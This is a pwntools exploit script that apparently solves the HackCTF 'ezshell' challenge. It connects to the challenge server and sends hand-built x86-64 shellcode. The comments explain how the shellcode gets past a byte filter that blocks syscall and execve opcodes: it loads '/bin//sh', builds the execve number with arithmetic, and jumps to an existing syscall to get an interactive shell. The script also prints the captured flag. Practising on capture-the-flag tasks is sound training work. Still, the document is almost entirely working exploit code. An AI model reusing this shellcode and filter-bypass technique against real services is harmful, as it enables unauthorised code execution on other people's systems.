from pwn import * 

#p = process("./ezshell")
p = remote("ctf.j0n9hyun.xyz",3036)

# 64bit, canary on, nx off, pie on, relro full.
# it looks like input shellcode. 
# but it will strcat -> next to result. 
# and it filter some command - {'\xb0', '\x3b', '\x0f', '\x05'};
# after call result+2 -> it will start at  xor    rbp,rbp.
# those pre-shellcode will reset all registers to using XOR command.

# it blocked syscall(0f 05) and mov al,0x3b(execve call number)
# so we have to using syscall at result and calc- make 0x3b, break stack. 
# 1. 0x3b problem - mov al,0x2b -> xor al,0x2b(\x83\xf0\x2b) + xor al,0x10(\x83\xf0\x10)
# 2. syscall problem - using rip control ?
# syscall at 0x7fff1432e9d0 , and our syscall will at 0x7fff1432ea12 => -0x42
# jmp [rip-0x49] (\xff\x25\xb1\xff\xff\xff) - jmp didnt work. invalid sp address.
# so, i will make stack pointer before jump? when leave pointer to rsp, rip-0x92 has stack address.
# and, think same with ROP, push syscall gadgets addr to stack. 
#lea    rsp,[rip-0x99] (\x48\x8d\x25\x67\xff\xff\xff)

# in short, 1.set sp , 2. set "bin/sh" to rdi, 3. mov al,0x3b 
# 4. jmp to sysacall. . to -75 :  \xe9\xb2\xf\xff\xff 

payload = "\x64\x48\x8b\x23" # mov rsp,QWORD PTR fs:[rax] getting teb from FS register. it take stack's address.
#payload = "\x48\x8d\x25\x67\xff\xff\xff" # set sp : lea    rsp,[rip-0x99]
payload += "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" # mov rbx,"/bin//sh"
payload += "\x56\x53\x48\x89\xe7"#push rsi, push rbx, mov rdi,rsp
#payload += "\x56\x53\x54\x5f"#  push rbx, push rsp , pop rdi  
payload += "\x34\x3a" + "\x04\x01" # xor al,0x3b + add al,0x10
payload += "\xe9\xb2\xff\xff\xff" #jmp \xe9\xb2\xff\xff\xff ;

log.info(len(payload))
payload += payload + "\x90"*(30-len(payload))

log.info(len(payload))

pause()
p.sendline(payload)

p.interactive()
#HackCTF{아주_간단한_셸코딩^^}